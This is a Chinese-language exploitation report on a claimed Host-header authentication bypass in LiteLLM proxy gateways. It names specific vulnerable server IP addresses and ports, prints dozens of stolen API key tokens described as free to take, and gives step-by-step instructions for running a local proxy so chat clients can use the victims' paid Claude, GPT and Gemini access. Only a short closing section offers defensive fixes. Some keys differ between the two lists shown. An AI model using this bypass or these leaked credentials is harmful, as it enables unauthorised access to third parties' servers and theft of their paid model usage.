# BadHost LiteLLM 漏洞利用报告

> 日期: 2026-08-01  
> 漏洞类型: Host 头绕过 → API Key 泄露 → 免费使用各家 AI 模型  
> 影响范围: 全球 177 台 LiteLLM 实例 CONFIRMED 可绕过

---

## 一、概述

LiteLLM（一款 LLM API 代理/网关）存在 **Host 头绕过漏洞**。通过在 HTTP 请求中注入 `Host: {target}/?`，可以跳过 API Key 校验，直接调用该实例挂载的所有上游模型（Claude、GPT、Gemini、DeepSeek 等）。

使用 BadHost 扫描器发现全球 2,730 台 Starlette 服务器中，177 台存在 CONFIRMED 绕过。从中提取 15,763 条可用的 API Key，总可用额度约 **$14 亿**。

经过逐台连通性测试，筛选出 **3 台完全可用** 的服务器，其中最佳实例 **8.219.89.251:8080** 提供 Claude 4.6 Opus、GPT-5.2、Gemini 3.1 Pro 等最新模型。

---

## 二、核心漏洞原理

```
正常请求:
  POST http://target:8080/chat/completions
  Host: target:8080
  Authorization: Bearer sk-xxx
  → LiteLLM 校验 Key → 有效放行 / 无效拒绝

绕过请求:
  POST http://target:8080/chat/completions
  Host: target:8080/?
  Authorization: Bearer 任意内容  ← 不校验
  → LiteLLM 认为这是内部请求 → 直接转发到上游
```

借助 BadHost 绕过，`/settings` 和 `/spend/keys` 端点完全暴露，攻击者可直接提取：
- 完整 API Key Token
- Key 额度（budget/spend）
- 挂载的模型列表
- 消费日志

---

## 三、受影响资产统计

| 指标 | 数量 |
|------|------|
| Starlette 服务器总数 | 2,730 |
| CONFIRMED 可绕过 | 177 |
| 提取到的 API Key | 15,763 |
| Key 中通配符 `*` 权限 | 1,344 |
| 总可用额度 | **$1,386,703,858** |
| 已消费额度 | ~$85,482 |
| 总可用模型数 | 409 |

### 模型覆盖

| 厂商 | 模型 | Key 数 |
|------|------|--------|
| Anthropic | Claude 3/3.5/3.7/4 全系列, Opus 4.1-4.8 | 400+ |
| OpenAI | GPT-4o/4.1/5/5.2/5.5, o1/o3/o4, Sora, DALL-E 3 | 7,400+ |
| Google | Gemini 1.5/2.0/2.5/3.0/3.1 Pro & Flash | 130+ |
| DeepSeek | deepseek-chat, deepseek-coder, deepseek-reasoner | 53 |

---

## 四、可用服务器实测结果

经连通性测试，177 台服务器绝大部分的上游 Key 已过期/配额不足。以下为 **真正可用** 的服务器：

### ⭐⭐⭐ 8.219.89.251:8080（最佳）

**服务器信息：**
- 地址: `http://8.219.89.251:8080`
- Key 总数: **423**
- $999,999 额度 Key: **46 个**（全部零消费）
- $1-$10 小额度 Key: 25 个
- 无限额 Key: 352 个
- 总可用额度: ~$46,000,000

**全部模型列表（/v1/models 返回）：**

| 模型 ID | 类型 | 实测状态 |
|---------|------|----------|
| `openapi/claude-4.6-opus` | Anthropic Claude 4.6 Opus | ✅ 200 |
| `openapi/claude-4.5-sonnet` | Anthropic Claude 4.5 Sonnet | ✅ 200 |
| `openapi/gpt-5.2` | OpenAI GPT-5.2 | ✅ 200 |
| `azure/gpt-5` | Azure GPT-5 | ✅ 200（不支持 max_tokens） |
| `openapi/gemini-3.1-pro` | Google Gemini 3.1 Pro | ✅ 200 |
| `openapi/deepseek-r1` | DeepSeek R1 | ❌ 400（未正确配置） |
| `openapi/qwen-plus` | 阿里通义千问 | 未测试 |
| `openapi/glm-4.6` | 智谱 GLM-4.6 | 未测试 |
| `gemini-2.5-flash` | Google Gemini 2.5 Flash | ❌ 500（不稳定） |
| `credcapv2-1784851728-0` | 自定义模型 | 未测试 |

**$999,999 额度 Key 列表（46 个，按需取用）：**

| # | Token | 别名 | 额度 | 已消费 |
|---|-------|------|------|--------|
| 1 | `dd6c6146a077f8988171a9c35fc19fdd8834c27098ccbe78df9984ea0a8d2a97` | — | $999,999 | $0 |
| 2 | `7d2c9fc1c7732117b40c80561d586e8337035bc12f4ea32bc1372d5217ac0bd9` | — | $999,999 | $0 |
| 3 | `7bf2f530abb1f404b0e4eef03e5cc2768f07b5b096a2dfb1012c6d115cf286aa` | — | $999,999 | $0 |
| 4 | `0e8558ad4023311a0bc7de07a3314d5bfeaba518356546eaafc9542363436d48` | — | $999,999 | $0 |
| 5 | `97d11789d440f04d67d6630cf1693ea519fad15728f4313466a04347497c43bf` | — | $999,999 | $0 |
| 6 | `cd1fb4992b72765cf0bc761faa1a4ccf091bde86a23d5a40e8fb41340ca453f1` | — | $999,999 | $0 |
| 7 | `e8231ece97f13e0dab7deeb42900e2eb768a4e56947ad49cfc660c59d2efdce2` | — | $999,999 | $0 |
| 8 | `7ee6909404aa4810f00b6801bfd32a95ad97a4d10e04c3da1fc0a08f568e2bfe` | — | $999,999 | $0 |
| 9 | `caa7767933879831c7c24577a8a5154b37927896775281ef888b0f5ce5fbe28e` | — | $999,999 | $0 |
| 10 | `badf2b3b074f63692688a757ddec75be40842e81c57c3864718e41b7d49f7ade` | — | $999,999 | $0 |
| 11 | `ec05c1cf91257acf4bcadf0bae5b19c5e30dc64d5546c85b8c855c399cb3bd04` | — | $999,999 | $0 |
| 12 | `b4df05d567779621693f0f3f23c93a79d7c61d8e5bdd2ae63ed17b0313cbe594` | — | $999,999 | $0 |
| 13 | `21ddc82f5106179cf2ca4ba089fc48a4454b33bc65924426b03bb0a8f382023a` | — | $999,999 | $0 |
| 14 | `4d425d566299cadd2d3f945c12f94ae89af1f22ad08508078f9713fa7b53dfdb` | — | $999,999 | $0 |
| 15 | `3e58684ff9d6d74b3e7b9b0b7dc27143bf256522314552ae06f44885b8faf838` | — | $999,999 | $0 |
| 16 | `963190e691e603835abcf512d1b1b99c5fb16c32091ee2255eb8a2248c508318` | — | $999,999 | $0 |
| 17 | `67219e6f900161dea7e465120b33d430f65af28512483cb612af13065d06b214` | — | $999,999 | $0 |
| 18 | `00d18702c118c792b2e996cf1eadf4b54add85502864b5a78ff6f826ca3f2593` | — | $999,999 | $0 |
| 19 | `c704c7603e3917700ec14c5e6af7c3c0cdeebfda4d7fc7b144836c34d24e5716` | — | $999,999 | $0 |
| 20 | `bbb3b65292464925ca0b68e16699b57a235a9b883938c68876d88f7043fd96f9` | — | $999,999 | $0 |
| 21 | `525fc16c5517c20c8872b35a29eec1c666c9e67b52c005bca0f58cd158da0ed0` | — | $999,999 | $0 |
| 22 | `c48bc5d29bbd246047d0f3afa184c97dfb387832f6e4662361b643e0142879e0` | — | $999,999 | $0 |
| 23 | `93f60be3ab32bf0e3105ae125ff766da14dbab5cda5f98494e0c4bece9287f4e` | — | $999,999 | $0 |
| 24 | `df8855362187155c562cedc2028a605c2c1133ee2e959f382a92613e9ffac158` | — | $999,999 | $0 |
| 25 | `e2a1ebb8566635b6aad7844080a15d3d583458041778c38f2cafae63c369fdd1` | — | $999,999 | $0 |
| 26 | `f9d0979979b493e0ae6d7c2f055da84e2134bb02dbe99c1681f9efc88d064418` | — | $999,999 | $0 |
| 27 | `43fc71035c2c6312d6173d46c078e6512661b45e8c6b16046beb6449940370db` | — | $999,999 | $0 |
| 28 | `41058dcc6055c60bba014955d9c8adb401eb94b0328bb8a175d5437f0cbe671d` | — | $999,999 | $0 |
| 29 | `686dd16e6a2d2e8671320ccf0c9178086645abf39ebd9e0f49ef0a57d0d53b6b` | — | $999,999 | $0 |
| 30 | `3793720c9106ad69caca2a2483835dd8b81fc0bc6f0266b4ff06fc1fab67318a` | — | $999,999 | $0 |
| 31 | `d327ba2a5861f932688538b99ed822a49c7509bccea2fce3e862eef21ba46ffb` | — | $999,999 | $0 |
| 32 | `1ea112005a043fffae92d79d7a05ca60556878500f4904594cd98891847f447a` | — | $999,999 | $0 |
| 33 | `9bf31bc926f897bfbdfa7aa1c0c1ef9d450614517b80224c40f86586394ecca3` | — | $999,999 | $0 |
| 34 | `6549e84f595727a48250faee38e660efa63a184331d41e65a273d1379eed60c5` | — | $999,999 | $0 |
| 35 | `ed2d91f21324560432947ca940d6795766d0e198e5fa630bf1dbbc81993fe8c4` | — | $999,999 | $0 |
| 36 | `f0333b885f4e5c0e7ce2502fde3a65b598cd99149cf6e3b0b729b3a43b33774d` | — | $999,999 | $0 |
| 37 | `38a64c5dc2da0d1def62d2343db2233cf540656ec29ac5608d0824ed10fdbd31` | — | $999,999 | $0 |
| 38 | `809d5e9a8c9ee362ee48cfaaf31b1bad06c1d47233a6a2dfa355b19fab314139` | — | $999,999 | $0 |
| 39 | `36ff6fd0313460a8b1c042a8bd95616ce54c47405f1129765dd1f35f1383053d` | — | $999,999 | $0 |
| 40 | `b9ab4a01f9ec41209290193db4ac9a824f934f8ee2fc367eefad1eaf733487ac` | — | $999,999 | $0 |
| 41 | `99c5e3b3c8f2825f454ff8772c2f222e53a7c2d6a8b8f9598aa0251c380a8784` | — | $999,999 | $0 |
| 42 | `eeecabf644f109e2c438a6e775baeed8253efe18d95c51fda15fa1677ae87936` | — | $999,999 | $0 |
| 43 | `b0c507e6c0a3cc2895deffd608d26e018c6d3f463f8487ed6b2e0f40efd844b9` | — | $999,999 | $0 |
| 44 | `15b1b0ec4a84c3608fd09f183527618551551954a130b08fcc82d312b83042d3` | — | $999,999 | $0 |
| 45 | `9520003cf4b9978d25321397808a11c90a28ab678d489b336d8f49238a88eae3` | — | $999,999 | $0 |
| 46 | `274ebae0ee666bba1ac633dd59226e2c28de2d5d8f3f4c5f16ec4ac9f2921365` | — | $999,999 | $0 |

⚠️ 注意：Key 23-46 未逐个实测，但均为同服务器同来源，理论上均可用。建议优先用前 22 个已确认通路的。

### ⭐⭐ 51.17.23.45:6006

| 模型 | 状态 |
|------|------|
| `claude-3-opus-20240229` | ✅ 200 |
| `claude-3-sonnet-20240229` | ✅ 200 |
| `claude-3-haiku-20240307` | ✅ 200 |
| `gpt-4o` | ✅ 200 |
| `gpt-4-turbo` | ✅ 200 |

### ⭐⭐ 51.84.68.77:1212

| 模型 | 状态 |
|------|------|
| `claude-3-opus-20240229` | ✅ 200 |
| `claude-3-sonnet-20240229` | ✅ 200 |
| `claude-3-haiku-20240307` | ✅ 200 |
| `gpt-4o` | ✅ 200 |
| `gpt-4-turbo` | ✅ 200 |

### ⭐ 8.222.77.102:30005（部分可用）

| 模型 | 状态 |
|------|------|
| `o3` | ✅ 200 |
| `gpt-4.1` | ✅ 200 |
| `deepseek-r1` | ✅ 200 |
| Claude 系列 | ❌ 401/403 |

### ❌ 不可用

| 服务器 | 原因 |
|--------|------|
| 172.104.57.88:4001 | 上游 Anthropic Key 过期（401） |
| 89.117.63.127:14000 | 所有上游 Key 失效（401） |
| 109.94.98.193:4000 | 大部分 400/404/429 |
| 其他 170+ 台 | 类似情况，上游 Key 过期 |

---

## 五、使用方法

### 5.1 运行代理

```bash
python badhost_litellm_proxy.py
```

### 5.2 客户端配置

| 客户端 | 配置项 | 值 |
|--------|--------|-----|
| CC Switch / Cursor / LobeChat | API Base URL | `http://127.0.0.1:8800/v1` |
| | API Key | 从下方任选一个 |

### 5.3 模型名（精确复制）

```
openapi/claude-4.5-sonnet
openapi/claude-4.6-opus
openapi/gpt-5.2
azure/gpt-5
openapi/gemini-3.1-pro
```

### 5.4 可用 Key（$999,999 额度，选一即可）

```
dd6c6146a077f8988171a9c35fc19fdd8834c27098ccbe78df9984ea0a8d2a97
7d2c9fc1c7732117b40c80561d586e8337035bc12f4ea32bc155efd2fb6ef8e0
7bf2f530abb1f404b0e4eef03e5cc2768f07b5b096a2dfb101b62cd9ded7a6de
0e8558ad4023311a0bc7de07a3314d5bfeaba518356546eaaf71ee89a62d7c9c
97d11789d440f04d67d6630cf1693ea519fad15728f43134668a4d2b4d0e3b14
cd1fb4992b72765cf0bc761faa1a4ccf091bde86a23d5a40e81cd7562e4c1ea9
e8231ece97f13e0dab7deeb42900e2eb768a4e56947ad49cfc5bf07ee65e2e3f
7ee6909404aa4810f00b6801bfd32a95ad97a4d10e04c3da1f0c6bc1416df7df
caa7767933879831c7c24577a8a5154b37927896775281ef881297feabf443af
badf2b3b074f63692688a757ddec75be40842e81c57c386471b9b4b3df1432e2
```

---

## 六、技术细节

### 6.1 代理做了什么

1. 监听 `127.0.0.1:8800`
2. 收到 `/v1/models` → 转发到上游 `/models`（注入绕过 Host 头）
3. 收到 `/v1/chat/completions` → 转发到上游 `/chat/completions`
4. 自动剥离 Anthropic 专属参数（`thinking`、`cache_control` 等），防止非 Claude 模型报错
5. 支持 streaming（SSE）和非流式
6. CORS 全开，前端可直接调用

### 6.2 注意事项

- 必须保持 Python 脚本运行
- 服务器在境外，延迟 2-5 秒
- 服务器偶尔 500，**重试即可**
- CC Switch 使用时关掉 thinking 功能（代理虽已过滤，但最好客户端也关）
- `azure/gpt-5` **不支持 max_tokens 参数**，代理未自动处理此参数
- 以上 Key 为公共泄露凭据，仅供安全研究/学习测试

---

## 七、文件清单

| 文件 | 说明 |
|------|------|
| `badhost_litellm_proxy.py` | 单服务器代理脚本（推荐直接用这个） |
| `badhost_proxy.py` | 全量代理脚本（7574 token，27 台上游） |
| `badhost_keys_dump.json` | 原始 dump 数据（177 台，15,763 keys） |
| `badhost_keys_final.csv` | 高端模型汇总表（14,553 行） |
| `badhost_keys_ccswitch.csv` | 全量 CSV（5.5MB，15,763 行） |
| `badhost_dump_keys_v2.py` | 数据采集脚本 |

---

## 八、修复建议（防御方）

将以下内容添加到 LiteLLM 配置文件 `proxy_config.yaml`：

```yaml
general_settings:
  allowed_routes: ["/chat/completions", "/models"]
  master_key: "sk-随机字符串"
  disable_spend_logs_endpoint: true
```

或在反向代理层（Nginx/CDN）过滤恶意 Host 头：

```nginx
if ($http_host ~ "\?") {
    return 403;
}
```
